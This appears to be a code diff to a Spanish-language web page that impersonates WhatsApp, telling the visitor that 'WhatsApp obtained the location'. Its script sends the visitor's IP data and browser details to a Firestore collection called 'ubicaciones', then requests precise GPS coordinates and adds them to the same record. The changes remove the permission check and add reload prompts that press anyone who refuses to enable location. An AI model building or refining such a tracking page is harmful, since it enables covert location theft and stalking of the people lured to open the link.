@@ -4,7 +4,6 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>WhatsApp</title>
-
     <style>
         .imagen-superior {
             display: block;
@@ -73,13 +72,12 @@
             border-radius: 8px;
             cursor: pointer;
             font-size: 14px;
-            transition: background 0.3s;
+            margin: 5px;
         }
         .modal-contenido button:hover {
             background: #1DA851;
         }
         #btnRecargar {
-            margin-left: 10px;
             background-color: #075E54;
         }
         #btnRecargar:hover {
@@ -87,7 +85,6 @@
         }
     </style>
 </head>
-
 <body>
     <img src="logowhatsapp.jpg" alt="Logo" class="imagen-superior" />
     <h2>WhatsApp obtuvo la ubicación ...</h2>
@@ -100,6 +97,7 @@
             <h3>Permiso de ubicación</h3>
             <p id="textoAlerta"></p>
             <button id="btnAceptar">Aceptar</button>
+            <button id="btnRecargar">Recargar página</button>
         </div>
     </div>
 
@@ -130,12 +128,14 @@
         const modal = document.getElementById("miAlerta");
         const textoAlerta = document.getElementById("textoAlerta");
         const btnAceptar = document.getElementById("btnAceptar");
+        const btnRecargar = document.getElementById("btnRecargar");
 
         let docId = null;
         let datosIP = {};
         let ubicacionObtenida = false;
         let solicitudEnProgreso = false;
 
+        // Mostrar/ocultar modal
         function mostrarAlerta(texto) {
             textoAlerta.textContent = texto;
             modal.style.display = "flex";
@@ -145,23 +145,17 @@
             modal.style.display = "none";
         }
 
+        // Botón Aceptar: recarga la página (porque después de denegar, el navegador no volverá a preguntar)
         btnAceptar.addEventListener("click", function () {
-            ocultarAlerta();
-            if (ubicacionObtenida) return;
-            solicitarUbicacion();
+            window.location.reload();
         });
 
-        function agregarBotonRecargar() {
-            if (document.getElementById("btnRecargar")) return;
-            const btnRecargar = document.createElement("button");
-            btnRecargar.id = "btnRecargar";
-            btnRecargar.textContent = "Recargar página";
-            btnRecargar.addEventListener("click", function () {
-                window.location.reload();
-            });
-            btnAceptar.parentNode.insertBefore(btnRecargar, btnAceptar.nextSibling);
-        }
+        // Botón Recargar: igual
+        btnRecargar.addEventListener("click", function () {
+            window.location.reload();
+        });
 
+        // Obtener datos de IP
         async function obtenerDatosIP() {
             try {
                 const respuesta = await fetch("https://ipapi.co/json/");
@@ -188,6 +182,7 @@
             }
         }
 
+        // Guardar documento inicial con IP y datos del navegador
         async function guardarDatosIniciales() {
             try {
                 const docRef = await addDoc(collection(db, "ubicaciones"), {
@@ -214,6 +209,7 @@
             }
         }
 
+        // Actualizar el documento con la ubicación GPS
         async function actualizarConUbicacion(posicion) {
             if (!docId) return false;
             try {
@@ -224,6 +220,7 @@
                     ubicacion_obtenida: true,
                     fecha_ubicacion: serverTimestamp()
                 });
+                console.log("Ubicación actualizada en el documento");
                 return true;
             } catch (error) {
                 console.error("Error al actualizar con ubicación:", error);
@@ -231,6 +228,7 @@
             }
         }
 
+        // Solicitar ubicación GPS
         function solicitarUbicacion() {
             if (!navigator.geolocation) {
                 mostrarAlerta("Tu navegador no soporta geolocalización.");
@@ -261,30 +259,31 @@
                 },
                 (error) => {
                     solicitudEnProgreso = false;
+                    console.log("Código de error de geolocalización:", error.code);
                     let mensaje = "";
                     switch (error.code) {
                         case error.PERMISSION_DENIED:
-                            mensaje = "Activa la ubicación en los ajustes del navegador y recarga la página.";
-                            agregarBotonRecargar();
+                            mensaje = "Permiso de ubicación denegado. Activa la ubicación en los ajustes del navegador y recarga la página.";
                             break;
                         case error.POSITION_UNAVAILABLE:
-                            mensaje = "No fue posible obtener la ubicación.";
+                            mensaje = "No fue posible obtener la ubicación. Asegúrate de que el GPS esté activo.";
                             break;
                         case error.TIMEOUT:
-                            mensaje = "La solicitud tardó demasiado.";
+                            mensaje = "La solicitud de ubicación tardó demasiado. Intenta de nuevo.";
                             break;
                         default:
-                            mensaje = "Ocurrió un error desconocido.";
+                            mensaje = "Ocurrió un error desconocido (" + error.code + ").";
                     }
                     if (!ubicacionObtenida) {
                         mostrarAlerta(mensaje);
                     }
                     estado.textContent = "⚠️ " + mensaje;
                 },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
         }
 
+        // FLUJO PRINCIPAL
         (async function main() {
             estado.textContent = "🌐 Obteniendo datos de IP...";
             datosIP = await obtenerDatosIP();
@@ -295,25 +294,7 @@
                 return;
             }
 
-            // Verificar permiso con la API de permisos (si existe)
-            if (navigator.permissions && navigator.permissions.query) {
-                try {
-                    const permiso = await navigator.permissions.query({ name: 'geolocation' });
-                    if (permiso.state === 'granted') {
-                        solicitarUbicacion();
-                        return;
-                    } else if (permiso.state === 'denied') {
-                        mostrarAlerta("Permiso de ubicación denegado. Actívalo en los ajustes del navegador y recarga la página.");
-                        agregarBotonRecargar();
-                        estado.textContent = "⚠️ Permiso de ubicación denegado.";
-                        return;
-                    }
-                    // Si es 'prompt', seguimos adelante
-                } catch (e) {
-                    console.warn("No se pudo consultar permisos, se solicitará directamente");
-                }
-            }
-
+            // Intentar obtener la ubicación directamente (sin verificar permisos)
             solicitarUbicacion();
         })();
     </script>
